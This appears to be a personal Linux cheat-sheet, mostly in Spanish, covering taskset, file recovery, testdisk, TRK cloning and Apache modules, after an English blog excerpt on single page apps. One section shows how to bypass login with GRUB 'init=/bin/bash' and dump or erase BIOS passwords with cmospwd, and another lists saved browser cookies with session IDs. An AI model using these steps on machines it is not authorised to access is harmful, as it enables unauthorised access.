Single page apps are not a new concept, but up until now they were typically a bad solution for public websites that depend on hits from search engines: You could do single page apps all you wanted, but you'd still have to have an HTML fallback for search engines, so that if Googlebot visited, say, http://example.com/article/12, the server would OUTPUT an HTML version of article no. 12.

While having this sort of HTML fallback was technically possible, it added a lot of extra work to public-facing single page apps, to the point where many developers dropped the idea and simply went back to the "normal" way of doing things: An MVC framework that creates HTML on the server.


#### What this means for web development ####

With the new improvements to Googlebot, single page apps will likely advance from being niche solutions for non-public websites to being the default way to build websites. A website will contain a single HTML page (typically heavily cached and served via a CDN). The JS on that page will then fetch content (as JSON) from the server and change the path as necessary using pushState.

Again, the idea behind this is not new - the revolution here is that it seems you now no longer have to provide the fallback server-generated HTML, and that is a huge time saver, and it makes all the difference when deciding between making a single page app or a "normal" website that creates HTML on the server.

The popular web frameworks of today are only partially ready for this new reality. They are ready in the sense that they all can function as JSON backends. Their main drawback is that they still exist within the realm of the "old" way of doing things, so each request to the framework might contain code that is not necessary for a slim JSON-OUTPUTting framework. Also, all of the frameworks' tutorials and code examples describe how you would do things the old way, including the standard type of form validation where, if some fields are not filled in correctly, you re-output the form HTML with included error messages.

Another new thing is that we might want to reconsider the idea that JS and CSS should always go in external files. The main reason for putting e.g. CSS in a separate file on a "normal" site is that when a user goes from page A to page B on your site, she doesn't have to re-load and re-evaluate the CSS, as it is already cached. But if your site only features a single HTML page that never changes, it would actually often make sense to put the CSS inside a <style> tag on the page - and the JS inside a <script> tag. This saves several extra HTTP requests.


#### Doesn't work with Facebook yet ####

While Google's new approach to single page apps will probably mean that single page apps become the default, there are still a few reasons why you might want to do things the "old" way if you're making a new project in 2014:

When you share/like something on Facebook, the Facebook crawler will visit that page and extract some content from it (e.g. the title, an image, etc.). This does not currently work for single page apps that don't have an HTML fallback: When you share a page whose content is generated by JS on the client, Facebook will not show any content from the page to its users, and that means the number of clicks you will get will be extremely limited.
While Googlebot seems to be able to handle JS, other search engine bots might not. If you expect a large number of visitors from other search engines than Google, don't go the single page app way just yet.
A lot of media websites base their ad pricing on the number of page views. If they switch to single page apps a few years from now, they will have to find another way of measuring popularity, since an entire user session where the user reads several pages only requires a single HTML page load.
IE versions before 10 don't support pushState. With a few lines of fallback code in your JS you can still make single page apps work, though.


#### The upsides to single page apps ####

All in all there are many aspects to consider when deciding whether to go for a single page app, but overall I would say that Googlebot's new improvements are a huge step towards making single page apps the web development standard rather than a niche - and this has a number of advantages:

Provided that your JSON backend is fast, users should experience a faster and better experience on your website as going to a new "page" only involves fetching some JSON from the server and not an entire page.
Serverside programming will become a lot simpler and faster (however, it should be noted that much of the complexity will be moved to the frontend).
And finally, hosting costs will potentially go down a lot as each "page change" only involves getting some JSON, not a full HTML page.


#############################################################################################################################################################################################

############################################################################################ taskset ########################################################################################

#### taskset

#### el affinity flag ####

el af es una mascara de bits que se crea para cada nuevo proceso e indica al planificador que procesadores pueden ejecutar dicho proceso. en esta mascara cada bit representa a un procesador, siendo el procesador #0 el bit menos significativo.

cuando un proceso se crea, por defecto su af es 0xffffffff. esto significa que cuando el proceso sea desalojado de un procesador, cualquier otro procesador podra seguir con su ejecucion.

por defecto esta solucion permite al planificador del kernel seleccionar cada vez cualquier cpu para cualquier proceso.

#### cualquier usuario puede obtener el af de un proceso de una forma facil, imaginemos que el proceso tiene como pid el 12345: ####

taskset -p 12345   - salida: pid 1611's current affinity mask: 3

?vaya! los he enganado! esto me ha dicho <3> en lugar del numerajo que os habia dicho... pues muy sencillo, en el caso del ejemplo resulta que el sistema tiene solo 2 procesadores: esto es, los dos bits menos significativos a 1 o lo que es lo mismo, 3 en decimal. ?que quiere decir esto? pues que por defecto el af tiene a 1 todos los cpu's de nuestro sistema.

#### modificar el af ####

#### ya sabemos como funciona por defecto el af, ahora bien, hemos dicho que un determinado proceso no queremos que nos ocupe una determinada cpu. lo unico que debemos hacer es alterar su af: si no queremos que pueda entrar en la cpu #0 entonces su af debe ser 0xfffffffe. ahora supongamos que el pid de dicho proceso es 12345: ####

taskset -p 0xfffffffe 12345

#### esta solucion es valida si el proceso ya estaba en ejecucion, pero si queremos lanzar uno nuevo especificando su af: ####

taskset 0xfffffffe /etc/init.d/lapd start

#### y si somos unos vaguetes y no queremos andar con mascaras, podemos indicar tambien una lista de cpu's donde puede correr nuestro proceso: ####

taskset -p -c 1,2,5-8 12345   - esto hace que el proceso cuyo pid es 12345 pueda ser procesado por las cpu's #1, #2, #5, #6, #7 y #8. si queremos lanzar un proces nuevo:

taskset -c 0 ls   - esto hace que el comando ls sea ejecutado unicamente por la cpu #0.


#### notas: ####

un apunte mas: solo el senor root puede establecer un fa. tambien lo pueden hacer usuarios con cap_sys_nice activo (pero eso es harina de otro gran costal).

#############################################################################################################################################################################################

########################################################################################### xwinwrap ########################################################################################

#### xwinwrap

#### xwinwrap nos sirve para colocar un wallpaper o un video como fondo de escritorio ####

#### para videos ####

xwinwrap -fs -sp -ni -nf -st -s -b -- mplayer "$file" -quiet -noconsolecontrols -loop 0 -wid wid

#### para wallpapers ####

xwinwrap -ni -argb -fs -s -st -sp -b -nf -- /usr/lib/xscreensaver/glmatrix -window-id wid



#############################################################################################################################################################################################

############################################################################################# xclip #########################################################################################

#### xclip

#### xclip

# Copies the contents of the id_rsa.pub file to your clipboard

xclip -sel clip < ~/.ssh/id_rsa.pub


############################################################################################# tips ##########################################################################################

#### tips

#### ver las direcciones ip que se reciben de apache de acceso de archivo de registro. imprime las direcciones ip unicas a medida que llegan desde un archivo access.log de apache. la '-w interactiva "le dice a awk para empezar a escribir en la salida estandar de inmediato y no el bufer de la salida

tail -f /var/log/apache2/access.log | awk -w interactive '!x[$1]++ {print $1}'

#### mostrar valores numericos rgb por cada uno de los 256 colores en shell ####

for code in {0..255}; do echo -e "\e[38;05;${code}m $code: test"; done

#### guerra de las galaxias ####

telnet towel.blinkenlights.nl

#### ver el link donde nos lleva el acortador de links de google ####

googl () { curl -s -d "url=${1}" http://goo.gl/api/url | sed -n "s/.*:\"\([^\"]*\).*/\1\n/p" ;}


#############################################################################################################################################################################################

############################################################################################# xset ##########################################################################################

#### xset

#### xset nos es util para cambiar la velosidad del mouse ####

#### ejemplo de uso ####

xset m 1

xset m 2

xset m 3

xset m 4

xset m 5


#############################################################################################################################################################################################

########################################################################################### hardware ########################################################################################

#### hardware #### compatible

#### Si quereis saber si vuestro hardware es compatible con Linux, sobre todo antes de comprarlo, existe una web que os sera de gran ayuda: ####

http://www.linuxcompatible.org/ ####

#### De todos modos, si se trata de una impresora, podemos recurrir a: ####

http://www.linux-foundation.org/en/OpenPrinting

#### Si lo que buscamos es la compatibilida de una webcam, podemos mirar en: ####

http://mxhaard.free.fr/

#### Y si lo que queremos es ver si nuestra tarjeta wifi es compatible con Linux, podemos recurrir a: ####

http://linux-wless.passys.nl/


#############################################################################################################################################################################################

############################################################################################ cmospwd ########################################################################################

#### cmospwd #### bios

#### A veces nos encontramos con equipos que tienen password para acceder a la configuracion de la BIOS y alguien lo ha olvidado o no nos lo han querido dar. CmosPwd es una herramienta gratuita (no distribuida mediante licencia GPL) que nos permitira desencriptar el pasword almacenado en la CMOS, que se usa para acceder a la configuracion de la BIOS. ####

#### Esta heramienta, segun la informacion obtenida en su web, trabaja con las siguientes BIOS: ####

* ACER/IBM BIOS
* AMI BIOS
* AMI WinBIOS 2.5
* Award 4.5x/4.6x/6.0
* Compaq (1992)
* Compaq (New version)
* IBM (PS/2, Activa, Thinkpad)
* Packard Bell
* Phoenix 1.00.09.AC0 (1994), a486 1.03, 1.04, 1.10 A03, 4.05 rev 1.02.943, 4.06 rev 1.13.1107
* Phoenix 4 release 6 (User)
* Gateway Solo - Phoenix 4.0 release 6
* Toshiba
* Zenith AMI


CmosPwd funciona y se compila en los siguientes sistemas operativos:

* Dos-Win9x,
* Windows NT/W2K/XP/2003,
* Linux,
* FreeBSD and NetBSD. 

#### Y, por lo que he podido ver, esta incluida en muchas recopilaciones de herramientas, como por ejemplo UBCD, System Rescue CD ####

#### Pero veamos como utilizarla en un caso practico: ####

#### Imaginemos que tenemos un portatil con linux cuyo acceso a la configuracion de la BIOS ha sido protegido por contrasena. ####

#### Cuando se cargue el menu de opciones de grub, editamos la entrada que carga el kernel y la modificamos para que en lugar de iniciar el sistema, se inicie un shell. Ya sabemos: rw init=/bin/bash

#### E iniciamos. ####

#### Bien. Ahora que ya tenemos un shell, copiamos la herramienta, desde donde la tengamos guardada, por ejemplo: nuestro pendrive y la ejecutamos con el parametro /d: ####

# cmospwd /d

#### Con esto, estamos haciendo un volcado de la CMOS en pantalla. Pulsaremos Enter para ir pasando la informacion que nos muestra, y, entre todo ello, veremos la password que tiene la BIOS. ####

#### Si por alguna razon, no consiguieramos obtener la password de la BIOS, siempre podriamos hacer un kill para resetear la CMOS. ####

# cmospwd /k

#### Eso si. Si pensamos hacer un kill, recomiendo hacer antes un backup: ####

# cmospwd /d /w micmos.bak

#### Con esto, tendriamos un backup de nuestra CMOS en el fichero micmos.bak. ####

#### Para ver el contenido del fichero de backup, no tenemos mas que hacer un: ####

# cmospwd /l micmos.bak

#### Y si queremos restaurar la CMOS con el contenido del fichero en el que hemos hecho el backup: #####

# cmospwd /r micmos.bak

#### Al ejecutar el comando, nos dara tres opciones: ####

* 1 - Restaurar completamente la CMOS.
* 2 - Restaurar la CMOS, manteniendo la fecha y la hora.
* 0 - Abortar.

#### LA WIKI DONDE PODEMOS DESCARGAR LA HERRAMINETA ---> http://www.cgsecurity.org/wiki/CmosPwd ####


#############################################################################################################################################################################################

########################################################################################### ntfsprogs #######################################################################################

#### ntfsprogs es un paquete linux que contiene una amplia coleccion de utilidades que nos permiten trabajar con particiones NTFS.

#### Este paquete es habitual que este en los repositorios, asi que si teneis una distribucion Debian o basada en Debian, no teneis que hacer mas que un apt-get install para instalarlo. ####

apt-get install ntfsprogs

#### En cualquier caso, siempre podeis descargar el codigo fuente para instalarlo: http://sourceforge.net/project/showfiles.php?group_id=13956&package_id=14232 ####

#### Veamos que utilidades contiene este paquete: ####

    * ntfsfix tal y como dice la ayuda, ntfsfix es una utilidad que arregla algunos problemas comunes en volumenes NTFS.
    * mkntfs nos permite formatear una particion con el sistema de archivos NTFS.
    * ntfsinfo nos permite ver informacion detallada de volumenes NTFS.
    * ntfslabel nos permite ver y cambiar la etiqueta de volumen de una particion NTFS.
    * ntfsresize nos permite redimensionar un volumen NTFS de forma no destructiva, moviendo de forma segura cualquier dato si es necesario.
    * ntfsundelete nos permite recuperar archivos eliminados de una particion NTFS.
    * ntfscluster identifica ficheros en una region especifica de un volumen NTFS.
    * ntfscat muestra en pantalla ficheros de volumenes NTFS sin montar la particion.
    * ntfsls lista el contenido de directorios sin montar la particion.
    * ntfscp nos permite copiar ficheros en un volumen NTFS.
    * ntfsclone nos permite clonar volumenes NTFS o una parte de ellos.


#############################################################################################################################################################################################

################################################################################### recuperar datos borrados ################################################################################

#### Para la recuperacion de archivos, existen para Linux muchas opciones, como por ejemplo: ####

    * testdisk - Escaner de particiones y herramienta de recuperacion. Compatible con todas las particiones. GPL.
    * magicrescue - Recuperacion de "bytes magicos". GPL.
    * e2undel - solo en ext2. GPL.
    * recover - Solo particiones ext2. GPL.
    * recoverjpg - solo para archivos jpg/jpeg. GPL.
    * foremost - Recuperacion 'forense' de archivos en disco y unidades externas (camaras...). GPL.
    * sleuthkit - DOS, BSD, Mac & Sun partitions. IBM+GPL.
    * gddrescue - Usa posibles backups del archivo para evitar errores. GPL.

#### Veamos dos de estas herramientas para recuperar datos borrados en linux: magicrescue y foremost. Ambas se encuentran habitualmente en los repositorios, asi que, para instalarlas no tenemos mas que hacer: ####

# apt-get install magicrescue foremost


#### magicrescue

#### Esta herramienta recupera una amplia gama de archivos: avi, mp3, gimp-xcf, jpg, png, doc, odt, etc... Por cada tipo de archivo soportado tiene un archivo con receta ubicado en el catalogo /usr/share/magicrescue/recipes/ ####

root@adminies:/home/miusuario# ls /usr/share/magicrescue/recipes/

avi gimp-xcf gzip jpeg-jfif mp3-id3v2 perl zipelf gpl jpeg-exif mp3-id3v1 msoffice png


#### Para recuperar un archivo .zip, por ejemplo, ejecutariamos la siguiente instruccion: ####

# magicrescue -d /opt/tmp/ -r /usr/share/magicrescue/recipes/zip /dev/hda3

#### Con la opcion -d definimos el catalogo de destino de recuperacion. ####
#### Con la opcion -r le decimos el recipiente que debe buscar. Por ejemplo: .zip .jpg ####
#### El ultimo argumento es el sitio a escanear. ####


#### foremost

#### Es un programa similar al anterior. Podemos ver los tipos de archivos soportados haciendo un man, aunque tambien podemos verlo en el archivo de configuracion /etc/foremost.conf. ####

#### Veamos un ejemplo para recuperar un archivo doc borrado: ####

# foremost -t doc -o /tmp/recuperado -i /home/usuario/apuntes

#### Con la opcion -t indicamos el tipo de archivo a buscar. ####
#### Con la opcion -o indicamos el lugar donde almacenar los archivos recuperados. ####
#### Con la opcion -i indicamos el lugar a escanear ####


#############################################################################################################################################################################################

###################################################################### reparar tabla de particiones y sector de arranque ####################################################################

#### testdisk

#### testdisk es una herramienta que nos ofrece la posibilidad de reparar la tabla de particiones de nuestro disco duro o el sector de arranque (MBR). ####


#### testdisk es totalmente gratuito y esta disenado para correr en sistemas operativos: ####

* DOS.
* Windows (9x, NT4, 2000, XP, 2003)
* Linux
* FreeBSD
* NetBSD
* OpenBSD
* SunOS
* MacOS

#### Recuerdo que, en una ocasion estaba clonado una maquina de forma remota y tenia abiertos varios terminales, entre ellos, uno a la maquina a clonar y otro al servidor de clonacion. Con las prisas, me equivoque de terminal y me cargue la tabla de particiones del servidor de clonacion. Pues bien, gracias a testdisk, pude recuperar la tabla original y restaurarla. ####

#### Cosas que testdisk puede hacer (sacado del wiki de Testdisk: http://www.cgsecurity.org/wiki/TestDisk): ####

* Permite fijar una tabla de particiones recuperando una particion borrada.
* Permite recuperar el sector de arranque de una particion FAT 32 a partir un backup de dicho sector.
* Puede reconstruir un sector de arranque de una particion FAT12, FAT16 o FAT32.
* Permite fijar tablas FAT.
* Permite reconstruir el sector de arranque de particiones NTFS.
* Permite recuperar el sector de arranque de una particion NTFS a partir de un backup de dicho sector.
* Permite fijar una particion MFT usando una particion MFT de espejo.
* Permite encontrar ficheros borrados en particiones FAT.
* Permite copiar ficheros borrados de particiones FAT, NTFS y ext2/ext3.

#### Para ver como usarlo, paso a paso, lo mejor es recurrir al wiki de testdisk: http://www.cgsecurity.org/wiki/TestDisk_Step_By_Step ####



#### nota: ####

#### El ejemplo viene en ms-dos, pero es exactamente igual que en linux. ####

#############################################################################################################################################################################################

############################################################################################ cookies ########################################################################################

#### cookies

.statcounter.com	TRUE	/	FALSE	1524051189	is_unique	sc8370178.1366371188.0
.hackingarticles.in	TRUE	/	FALSE	1577144998	__cfduid	d0176cb4019ad430567408c8c604f155c1366048746
www.hackingarticles.in	FALSE	/	FALSE	1366543233	wfvt_796829555	5173c4798e293
.google.com	        TRUE	/	FALSE	1429117738	PREF	        ID=18eda4f26ab0a12e:TM=1366045742:LM=1366045742:S=QD3HE71OVOhbLScc
ask.wireshark.org	FALSE	/	FALSE	1367258331	sessionid	4a249e6d5e73b37012d407528c22a56e
.fanboy.co.nz	        TRUE	/	FALSE	1577145001	__cfduid	db267061a36f7d77a74baf0a8532243e41366410522
.zataz.com	        TRUE	/	FALSE	1577144995	__cfduid	d0b8f1db8145c7af1c926d1f8c24243b91366048709


#############################################################################################################################################################################################

########################################################################################## manifiestos ######################################################################################

#### manifiestos

I am a node of SERVER, born of flesh and blood but enhanced by the power of its web. I have no use for pain or fear. My scripts are a focus of my will. My strength is my knowledge. My weapons are my skills. Information is the blood of my body. I am part of the greater network. I am host to the vast data of SERVER. My flesh is weak, but my connection is eternal. And therefore, I am a god.  \m/-_-\m/


#############################################################################################################################################################################################

############################################################################################ ingles #########################################################################################

#### ingles

worthwhile = vale la pena

though = aunque, sin embargo

thought = pensamiento, idea, reflexion, consideracion, concepto, meditacion, nocion


#############################################################################################################################################################################################

######################################################################################## piropos ############################################################################################

#### piropos

eres el .gif que anima mi vida. 

quisiera se pagina para que me agregaras a tus favoritos.

sin ti mi vida seria como una web sin CSS.

ninguna grafica podria renderizar al 100% tu perfecta figura.

tienes permisos de root en mi vida. 

juntos somos como un procesador de doble nucleo. 


#############################################################################################################################################################################################

########################################################################################### trinity #########################################################################################

#### trinity #### trk 

#### mclone (Mass Clone) es una utilidad incluida a partir de la version 3-3 de TRK (no disponible en anteriores versiones) que nos permite clonar equipos a traves de la red via multicast.

La ventaja que nos ofrece un sistema de clonacion multicast es que un unico flujo de datos, proveniente de una determinada fuente, se puede enviar simultaneamente a diversos receptores, con lo que conseguimos menor trafico en la red y mayor velocidad de clonacion. En cambio, en un sistema de clonacion unicast, se envia un flujo de datos a cada cliente, con lo que la red estara mas ocupada y la clonacion sera mas lenta.

La ventaja de tener mclone incluido en TRK es que no necesitamos montar un servidor para clonar de forma remota varias maquinas. Con arrancar TRK ya lo tenemos disponible.

La clonacion con mclone es muy rapida, puesto que solo se envia un paquete a multiples receptores. Segun el autor de TRK, en un switch de 100 mbits, la media de velocidad es de alrededor de 93 mbits. Las limitaciones a la hora de clonar estaran en la velocidad de la red, el disco a clonar o la cpu de la maquina.

TRK dispone de una opcion muy interesante, que es arrancar en modo servidor. Esto nos permite arrancar el servidor desde nuestra instalacion en CD o USB e iniciar todos los clientes a traves de la red para ejecutar mclone en cada uno de ellos.

Segun el autor de TRK, una imagen de alrededor de 4Gb se clona en una red de 100 mbits en unos 7 minutos aproximadamente. Interesante, ?no?


#### Las principales caracteristicas de mclone son: ####

    * El sistema es rapido y escalable.
    * Nos permite realizar copias exactas de cualquier sistema operativo.
    * En sistemas Windows XP y Vista se utiliza ntfsclone.
    * Para otros sistemas de ficheros, la herramienta usa dd.
    * Permite utilizar tres tipos de algoritmos de compresion para crear las imagenes: gzip, bzip2 y 7-zip.
    * Permite restaurar los valores originales C/H/S (Cilindro, Cabeza, Sector) en sistemas NTFS. Ademas, lo hace automaticamente.
    * Permite correr, de forma separada, un maximo de 50 sesiones simultaneas sobre la red.
    * Permite ajustar la velocidad de clonacion, indicandole el maximo de mbits.
    * Permite clonar automaticamente o elegir los discos/particiones a clonar.
    * Permite sobreescribir o no el sector de arranque, segun le indiquemos.
    * Permite omitir el chequeo C/H/S.


#### Modo de uso ####

mclone tiene unos cuantos parametros, pero basicamente tenemos dos modos de uso:

    * Modo sender (mclone -s). Este modo nos permite servir la imagen de un equipo para clonar los demas. El equipo que ejecuta el modo sender es el que envia la imagen de si mismo.
    * Modo cliente (mclone). Este modo permite que los equipos clientes sean clonados con la imagen enviada por el equipo que ejecuta mclone en modo sender.


#### Clonacion directa de un equipo a otro u otros ####

El equipo que nos servira de modelo de clonacion ejecutara el modo sender:

# mclone -s


Los equipos destinatarios de la clonacion, se ejecutaran en modo cliente:

# mclone   - Una vez que los equipos esten listos y esperando, pulsaremos Enter en uno de ellos y comenzara el proceso de clonacion directamente.


#### Creacion de una imagen de un equipo ####

Ademas de clonar directamente de una maquina a otra u otras, podemos crear un fichero de imagen, que nos servira de modelo de clonacion posteriormente.

#### El equipo que servira de modelo ejecutara: ####

# mclone -s


#### El equipo que guardara la imagen ejecutara mclone con el parametro "-o" Por ejemplo: ####

# mclone -o equipomodelo   - Crearemos una imagen llamada equipomodelo. Ademas, la imagen se guardara sin comprimir como un conjunto de ficheros en un directorio con el nombre que hayamos indicado (equipomodelo en el ejemplo) y que mclone creara en el directorio actual, si no existe.


#### Si queremos crear la imagen comprimida, por ejemplo, en formato gzip, lo indicaremos con el comando -C tipocompresion. Veamos un ejemplo: ####

# mclone -C gzip -o equipomodelo


Debemos tener cuidado con la compresion. Por lo que dice el autor de TRK en su web, gzip es el unico compresor que no consume muchos recursos. Pero, si lo que queremos es mayor compresion, aunque la velocidad de transmision sea mas lenta, usaremos bzip2 o 7-zip como metodo de compresion.


#### Restaurar un equipo desde una imagen creada. ####

#### Una vez que tenemos una imagen en el equipo modelo, podemos servirsela a otras maquinas pasando el parametro "-i" a mclone. Siguiendo con el ejemplo anterior: ####

# mclone -i equipomodelo   - Como podemos ver, no es necesario especificar el sistema de compresion usado para crear la imagen. Mclone ya se encarga de detectarlo.


#### En el equipo que reciba la imagen, ejecutaremos mclone sin parametros: ####

# mclone

Otras opciones de mclone.

    * -n Nos permite indicar un numero maximo de sesiones cuando realizamos clonaciones multiples. Tanto en el cliente como en el servidor debemos especificar el mismo numero. Ejemplo: cliente -> mclone -n 5 - servidor -> mclone -s -n 5
    * -d omite la deteccion automatica de discos y nos permite especificar los discos que queremos clonar. Ejemplo: mclone -s -d /dev/sda,/dev/sdb
    * -p omite la deteccion automatica de particiones y nos permite especificar las que queramos clonar. Ejemplo: mclone -s -p /dev/sda1
    * -b omite la grabacion del sector de arranque. Esto nos servira si no queremos que al clonar se sobreescriba nuestro sector de arranque, por ejemplo, porque tengamos un gestor de arranque instalado.
    * -c omite la comprobacion C/H/S. Esta opcion no deberia ser necesaria, a menos que tengamos problemas con el arranque.
    * -t establece un timeout entre el primer cliente que conecta y el ultimo que puede conectar. El timeout por defecto es de 10 segundos.
    * -r establece la velocidad de transferencia. Podemos especificar el maximo bitrate en kilobit (k) o en megabit (m). Esto puede servirnos para no consumir todo el ancho de banda de la red al clonar. Ejemplo: mclone -s -r 70m
    * -C nos permite elegir el metodo de compresion a utilizar: gzip, bzip2 o 7-zip. Ejemplo: mclone -C gzip -o equipomodelo

#############################################################################################################################################################################################

#### trinity proxy ip fija

setip es otra de las utilidades incluidas en TRK. Este script nos permitira introducir una direccion IP fija para uestra tarjeta de red

#### Modo de uso: ####

setip | -h

#### Si no pasamos ningun argumento, el script asumira que el interfaz que queremos configurar es eth0: ####

# setip

#### Tambien podemos especificar el interfaz de red que queremos configurar: ####

# setip eth1

#### O podemos consultar la ayuda: ####

# setip -h

#### El script nos preguntara: ####

    * La direccion IP que queremos asignar al interfaz de red.
    * La mascara de subred.
    * La direccion IP de la puerta de enlace por defecto.
    * Y, por ultimo, la direccion IP del servidor de DNS que queremos usar.

Una vez introducidos los valores, nos informara de que se han aplicado.

#### Otro script util es setproxy. Este script nos sirve para configurar los datos del servidor proxy de salida. ####

#### Modo de uso: ####

setproxy

#### Ejecutamos el script sin argumentos y nos preguntara: ####

    * La direccion IP o el nombre del servidor proxy.
    * El puerto a usar en el proxy (Usualmente el 8080).
    * Y, opcionalmente, el nombre de usuario y el password. Si no fuera necesario introducir el password, lo dejaremos en blanco y pulsaremos Enter.

#############################################################################################################################################################################################

#### trinity virus scan

#### Para usar detectar y limpiar virus, arrancamos nuestro ordenador desde el TRK. Una vez arrancado, veremos el prompt del sistema. Ahi sera donde introduciremos el comando que nos permitira escanearlo.


#### Si queremos consultar la ayuda de viruscan, tecleamos 'virusscan -h' en la linea de comandos: ####

# viruscan -h   - Esta ayuda es auto-explicatoria y nos muestra un ejemplo de como usar el script.


#### Modo de uso: virusscan -a {clam,avg,fprot,bde,va} -c -g -n -d {DESTINO} ####

### Donde: ####

    * -a : Este parametro nos permite elegir el antivirus que queremos usar. Si queremos utilizar clamav, especificaremos: -a clam. Si queremos usar el antivirus f-prot, especificaremos: -a fprot. Si queremos usar AVG, especificaremos: -a avg. Si queremos usar BitDefender, especificaremos: -a bde y si queremos usar Vexira, especificaremos: -a va. Si omitimos el parametro -a, se usara el antivirus ClamAv por defecto.

    * -c: Indica que se van a usar extensiones comunes (esta opcion es para incrementar un poco la velocidad de ClamAv)

    * -g: Solo descarga. Esta opcion indica que qeremos descargar el antivirus y las actualizaciones, pero no queremos escanear buscando virus. Esta opcion esta pensada para usarse con updatetrk.

    * -d: Directorio a escanear. Si no se especifica ningun destino, viruscan escaneara todos los sistemas de ficheros locales que pueda encontrar. Podemos especificar multiples destinos, separandolos por comas (sin espacios detras).

    * -n: No actualizar. No busca nuevas firmas de antivirus.

    * -h: Nos muestra la ayuda.


#### Algunos ejemplos de uso: ####

# viruscan -a avg -d /mnt   - El comando anterior descarga y actualiza el antivirus AVG y escanea /mnt.

# viruscan -a va -g   - Descargamos el antivirus Vexira y sus actualizaciones, pero no escaneamos ningun directorio.

# viruscan -a fprot -d /hda1/Windows,/hda1/Archivos\ de\ programa   - Descargamos, actualizamos el antivirus F-prot y escaneamos los directorios /hda1/Windows y /hda1/Archivos\ de\ programa.

# viruscan -a bde -n -d /hda1/Mis\ documentos   - Utilizamos el antivirus BitDefender, sin descargar sus actualizaciones.

#############################################################################################################################################################################################

############################################################################################ rfkill #########################################################################################

#### rfkill

#### es util para activar/desactivar conexiones inalambricas como wifi", "wlan", "bluetooth", "uwb", "ultrawide-band", "wimax", "wwan", "gps" or "fm" ####

#### Veamos algunos ejemplos utiles de uso de esta herramienta: ####

#### Supongamos que queremos listar todos los dispositivos inalambricos independientemente del tipo que sean: ####

# rfkill list all   - Tipos de dispositivos que podemos especificar: "all",  "wifi", "wlan", "bluetooth", "uwb", "ultrawide-band", "wimax", "wwan", "gps" or "fm"

#### Supongamos que queremos activar la conexion wifi al arrancar el equipo. Podriamos anadir la siguiente linea al fichero /etc/rc.local: ####

# rfkill unblock wifi   - reiniciar la pc despues de usar este comando para que los cambios surtan efecto

#### Supongamos que queremos desactivar la conexion bluetooth al arrancar el equipo. Podriamos anadir la siguiente linea al fichero /etc/rc.local: ####

# rfkill block bluetooth   - reiniciar la pc despues de usar este comando para que los cambios surtan efecto

#### Supongamos que queremos desactivar todas las conexiones inalambricas al arrancar el equipo. Podriamos anadir la siguiente linea al fichero /etc/rc.local: ####

# rfkill unblock all   - reiniciar la pc despues de usar este comando para que los cambios surtan efecto

#### Si os fijais, estamos bloqueando conexiones por tipos de dispositivo. Tambien podriamos bloquear un dispositivo concreto especificando su identificador. El identificador es un numero que aparece al lado de la conexion. Por ejemplo, si ejecuto: ####

# rfkill list wifi

0: phy0: Wireless LAN
    Soft blocked: no
    Hard blocked: no

#### Supongamos que tenemos dos dispositivos wifi y queremos bloquear solamente uno. Podriamos listar todos los dispositivos wifi para ver sus identificadores y luego bloquear el que nos interese: ####

# rfkill list all

# rfkill block 0   - reiniciar la pc despues de usar este comando para que los cambios surtan efecto

#### Por ultimo, decir que tambien podemos monitorizar el estado de los dispositivos con: ####

# rfkill event


#############################################################################################################################################################################################

############################################################################################ apache #########################################################################################

#### apache

#### modulos

# In this how-to will show how to activate or deactivate available modules under a debian system running apache2. #

# 1. How it works: #

# There is 2 kinds of modules used by apache: #

    Modules compiled in

    Modules that are loaded when you launch apache

# In order to check which modules were compiled in with apache, you can type the following command: #

    $apache2 -l

    Compiled in modules:
    core.c
    mod_access.c
    mod_auth.c
    mod_log_config.c
    mod_logio.c
    mod_env.c
    mod_setenvif.c
    prefork.c
    http_core.c
    mod_mime.c
    mod_status.c
    mod_autoindex.c
    mod_negotiation.c
    mod_dir.c
    mod_alias.c
    mod_so.c


This list correspond to the modules compile with apache on an Ubuntu Dapper system. As you can see, there is no php, rewrite.... modules compiled in. Those modules are meant to be included when running apache.

# Now, let check the main apache configuration file, namely /etc/apache2/apache2.conf, around line 115, you can see those 2 lines: #

<br />
# Include module configuration:<br />
Include /etc/apache2/mods-enabled/*.load<br />
Include /etc/apache2/mods-enabled/*.conf<br />

# As you can see, apache load any files ending with .load first and .conf after, in /etc/apache2/mods-enabled/. #

# Now, let's have a look in that directory: #

    $ ls /etc/apache2/mods-enabled/

    actions.load php5.conf rewrite.load userdir.load
    cgi.load php5.load userdir.conf


# As you can see, I have cgi, actions, php5, userdir and rewrite modules enabled. This allow me to run an php5 scripts in /home/user/public_html using rewriting rules. #

# Going further up into the investigation, we can see that files in mods-enabled are not actually files, but links to files contained in mods-available: #

    ls -l /etc/apache2/mods-enabled/userdir.load

    lrwxrwxrwx 1 root root 30 2006-05-15 03:00 /etc/apache2/mods-enabled/userdir.load -> ../mods-available/userdir.load



# Now, let's have a look at /etc/apache2/mods-available: #

    ls /etc/apache2/mods-available/
    actions.load dav_fs.conf info.load proxy.load
    asis.load dav_fs.load ldap.load rewrite.load
    auth_anon.load dav.load mem_cache.load speling.load
    auth_dbm.load deflate.load mime_magic.conf ssl.conf
    auth_digest.load disk_cache.load mime_magic.load ssl.load
    auth_ldap.load expires.load php5.conf suexec.load
    cache.load ext_filter.load php5.load unique_id.load
    cern_meta.load file_cache.load proxy.conf userdir.conf
    cgid.conf headers.load proxy_connect.load userdir.load
    cgid.load imap.load proxy_ftp.load usertrack.load
    cgi.load include.load proxy_http.load vhost_alias.load


This basically contains all the files linked by mods-enabled plus a whole load of available modules.


#### 2. Adding modules: ####

Now, taking into account the strucutre of apache, it is pretty easy to add modules to be loaded by apache. Let's assume that you want to add mime_magic module. To do so, you can either:

# add it by hand: #

        $cd /etc/apache2/mods-enabled

        $ sudo ln -s ../mods-available/mime_magic.conf mime_magic.conf

        $sudo ln -s ../mods-available/mime_magic.load mime_magic.load

# add it the debian way with a2enmod: #

        $sudo a2enmod

        Which module would you like to enable?
        Your choices are: actions asis auth_anon auth_dbm auth_digest auth_ldap cache cern_meta cgid cgi dav_fs dav deflate disk_cache expires ext_filter file_cache headers imap include info ldap mem_cache mime_magic php5 proxy_connect proxy_ftp proxy_http proxy rewrite speling ssl suexec unique_id userdir usertrack vhost_alias
        Module name? mime_magic
        Module mime_magic installed; run /etc/init.d/apache2 force-reload to enable.


# That's it, your module will now be loaded next time you start apache. You can actually avoid restarting apache, by asking it to simply reload its configuration: #

    $ sudo /etc/init.d/apache2 reload


And here you go, your new added module is included in apache.


############################################################################################ proxy ##########################################################################################

#### proxy

Imaginemos que tenemos un equipo con linux y dos interfaces de red, que vamos a usar como servidor de acceso a internet:

    * eth0, una interfaz de red ethernet que conecta el equipo a nuestra red de area local.
